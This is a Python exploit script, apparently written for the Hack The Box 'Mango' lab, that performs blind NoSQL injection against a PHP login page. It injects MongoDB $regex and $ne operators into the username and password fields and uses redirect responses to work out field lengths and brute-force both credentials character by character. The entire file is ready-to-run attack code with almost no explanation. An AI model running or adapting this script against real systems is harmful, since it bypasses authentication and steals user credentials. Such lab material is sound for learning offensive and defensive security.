#! /usr/bin/python

import requests
import string
import sys
from urllib.parse import urlencode, quote_plus


def check_if_fieldContentExist(existantValues,newValue):
    if (len(newValue) > 3) and (len(existantValues) > 0) : #do the string matching after guessing at least 3 chars
        for value in existantValues:
            if len(value) >= len(newValue):
                if value[0:len(newValue)] == newValue:
                    return True
    return False
                
def bruteforce_fieldContent(url,fields,targetedFieldIndex,headers,fieldLength=100,existantValues=[]): 
    characters=string.printable
    keys=list(fields.keys())
    guessedValue=""
    badchars=['&','*','.','?','\\','|']
    if targetedFieldIndex < len(keys):
        index=keys[targetedFieldIndex]
        while (len(guessedValue)) < fieldLength :
            prev_value=""
            for c in characters:
                if c in badchars:
                    #c='?'
                    continue
                fieldString=""
                loop_counter=0
                for param,value in fields.items():
                    if (param==index) :
                        if guessedValue=="":
                            fields[param]='^'+c+'.*' # ^a.*
                        else:
                            fields[param]='^'+guessedValue+c+'.*' # ^adm.*

                    fieldString=(fieldString+param+"="+value+"&") if (loop_counter+1 < len(keys)) else (fieldString+param+"="+value)
                    loop_counter=loop_counter+1
                result=requests.post(url,data=fieldString,headers=headers,allow_redirects=False)
                if result.status_code==302:
                    guessedValue=guessedValue+prev_value
                    #print("[+] value found:"+guessedValue)
                    sys.stdout.flush()
                    sys.stdout.write("\r[+] value found:"+guessedValue)
                    sys.stdout.flush()
                    break # save the value
                prev_value=c
    return guessedValue

def bruteforce_fieldlength(url,fields,targetedFieldIndex,headers,maxLength=100):
    keys=list(fields.keys())
    if targetedFieldIndex < len(keys):
        index=keys[targetedFieldIndex]
        for i in range(0,maxLength):
            data={}
            fieldString=""
            loop_counter=0
            for param,value in fields.items():
                if (param == index):
                    fields[param]='.{'+str(i)+'}'
                fieldString=(fieldString+param+"="+value+"&") if (loop_counter+1 < len(keys)) else (fieldString+param+"="+value) #we will avoid auto encoding, because special chars like $ne,$regex seems to broke the NOSQLi for this application
                loop_counter=loop_counter+1
            result=requests.post(url,data=fieldString,headers=headers,allow_redirects=False)
            if result.status_code == 302: #in our case 302 is returned by app when login is successful
                continue
            elif result.status_code == 200:
                print("[+] value length is:"+str(i-2))
                return (i-2)
    return -1



    
url='http://10.10.14.9:1234/index.php' #proxy
url='http://staging-order.mango.htb/index.php'
headers={'Content-Type': 'application/x-www-form-urlencoded'}

inputs={'username[$regex]':'.{1}','password[$ne]':'toto','login':'login'}
print("[*] computing username char length")
usernameLength=bruteforce_fieldlength(url,inputs,0,headers,8) #brute force username length

inputs={'username[$ne]':'toto','password[$regex]':'.{1}','login':'login'}
print("[*] computing password char length")
passwordLength=bruteforce_fieldlength(url,inputs,1,headers,100) #brute force password length

print("[*] bruteforcing username")
inputs={'username[$regex]':'.*','password[$ne]':'toto','login':'login'}
username=bruteforce_fieldContent(url,inputs,0,headers,usernameLength)
print("\nusername is:",username)

print("[*] bruteforcing password for user admin:")
inputs={'username[$ne]':'mango','password[$regex]':'lol','login':'login'}
password=bruteforce_fieldContent(url,inputs,1,headers,passwordLength)

print("[*] bruteforcing password for user mango:")
inputs={'username[$ne]':'admin','password[$regex]':'lol','login':'login'}
password=bruteforce_fieldContent(url,inputs,1,headers,passwordLength)
print("\npassword is:",password)
